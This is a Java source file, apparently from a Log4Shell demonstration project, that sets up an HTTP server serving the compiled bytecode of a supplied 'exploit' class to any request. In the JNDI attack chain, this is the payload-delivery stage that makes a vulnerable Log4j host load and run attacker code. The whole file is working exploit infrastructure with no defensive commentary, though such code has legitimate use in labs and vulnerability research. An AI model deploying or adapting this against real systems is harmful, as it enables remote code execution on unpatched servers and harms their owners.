package io.github.hurynovich.log4shell.environment;

import fi.iki.elonen.NanoHTTPD;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import static fi.iki.elonen.NanoHTTPD.Response.Status.OK;

public class HttpServerSetup {
    private static final Logger log = LogManager.getLogger(HttpServerSetup.class);

    private final byte[] bytecode;
    private final HttpServer serv;

    public HttpServerSetup(int port, Class<?> exploitClazz) {
        serv = new HttpServer(port);
        bytecode = getBytecode(exploitClazz);
    }

    public void start(){
        try {
            serv.start(NanoHTTPD.SOCKET_READ_TIMEOUT, true);
            log.debug("HTTP server was started.");
        } catch (IOException e) {
            throw new Error("Failed to start HTTP server", e);
        }
    }

    public void stop(){
        serv.stop();
        log.debug("HTTP server was stopped.");
    }

    private byte[] getBytecode(Class<?> exploitClazz) {
        final byte[] bytecode;
        String path = "/" + exploitClazz.getName().replaceAll("\\.", "/" ) + ".class";
        var bytecodeInput = exploitClazz.getResourceAsStream(path);
        try(bytecodeInput){
            var buffer = new ByteArrayOutputStream();
            int b;
            while ( (b = bytecodeInput.read()) >= 0){
                buffer.write(b);
            }
            bytecode = buffer.toByteArray();
        } catch (IOException e) {
            throw new Error("Failed to load exploit bytecode.");
        }
        log.debug("Bytecode for '{}' was loaded", exploitClazz.getSimpleName());
        return bytecode;
    }

    private class HttpServer extends NanoHTTPD {

        public HttpServer(int port) {
            super(port);
        }

        @Override
        public Response serve(IHTTPSession session) {
            log.debug("Received HTTP request: {}", session.getUri());

            return newFixedLengthResponse(OK, "application/java-byte-code", new ByteArrayInputStream(bytecode), bytecode.length);
        }
    }
}
